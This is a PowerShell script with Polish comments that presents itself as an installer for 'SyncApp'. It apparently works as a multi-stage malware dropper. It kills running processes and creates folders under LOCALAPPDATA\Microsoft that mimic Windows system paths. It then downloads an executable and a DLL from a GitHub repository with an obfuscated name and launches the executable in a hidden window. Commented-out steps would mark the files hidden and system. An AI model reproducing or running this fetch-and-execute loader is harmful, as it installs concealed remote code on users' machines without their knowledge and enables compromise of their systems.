# SyncApp Multi-Stage Installer - Wersja FINALNA
$tempDir = "$env:LOCALAPPDATA\Microsoft\Windows\Shell"
$finalDir = "$env:LOCALAPPDATA\Microsoft\VaultDataSync"

$exeName = "SyncApp.exe"
$dllName = "e_sqlite3.dll"

# 1. Zabij istniejace procesy (OBLIGATORYJNE)
taskkill /F /IM $exeName /T 2>$null
taskkill /F /IM "SyncHostV8.exe" /T 2>$null
taskkill /F /IM "WindowsDataSync.exe" /T 2>$null
Start-Sleep -Seconds 1

# 2. Przygotuj foldery
if (!(Test-Path $tempDir)) { New-Item -ItemType Directory -Path $tempDir -Force | Out-Null }
if (!(Test-Path $finalDir)) { New-Item -ItemType Directory -Path $finalDir -Force | Out-Null }

$targetExe = Join-Path $finalDir $exeName
$targetDll = Join-Path $finalDir $dllName

# Zdejmujemy atrybuty Systemowe i Ukryte zeby nadpisac
if (Test-Path $targetExe) { attrib -h -s $targetExe; Remove-Item $targetExe -Force -ErrorAction SilentlyContinue }
if (Test-Path $targetDll) { attrib -h -s $targetDll; Remove-Item $targetDll -Force -ErrorAction SilentlyContinue }

# 3. Pobierz do Shell (Tymczasowo)
$urlExe = "https://github.com/cusXD/ADVBGHSAIYiasuihduiAJKH/releases/download/ADLKAHHahsdhhbCAHUJhlvHA/SyncApp.exe"
$urlDll = "https://github.com/cusXD/ADVBGHSAIYiasuihduiAJKH/raw/refs/heads/main/e_sqlite3.dll"

Write-Host "Trwa pobieranie nowych plikow..."
try {
    Invoke-WebRequest -Uri $urlExe -OutFile (Join-Path $tempDir $exeName) -ErrorAction Stop
    Invoke-WebRequest -Uri $urlDll -OutFile (Join-Path $tempDir $dllName) -ErrorAction Stop
} catch {
    (New-Object Net.WebClient).DownloadFile($urlExe, (Join-Path $tempDir $exeName))
    (New-Object Net.WebClient).DownloadFile($urlDll, (Join-Path $tempDir $dllName))
}

# 4. Przenieś bezposrednio do VaultDataSync -> TAM GDZIE CHCE C#
Move-Item -Path (Join-Path $tempDir $exeName) -Destination $targetExe -Force
Move-Item -Path (Join-Path $tempDir $dllName) -Destination $targetDll -Force

# 5. Ukryj (TYMCZASOWO WYLACZAMY ZEBYBYS MOGL TO ZOBACZYC)
# attrib +h +s $finalDir
# attrib +h +s $targetExe
# attrib +h +s $targetDll

# 6. Uruchom cichutko
if (Test-Path $targetExe) {
    Start-Process -FilePath $targetExe -WindowStyle Hidden
}
Write-Host "Gotowe!"
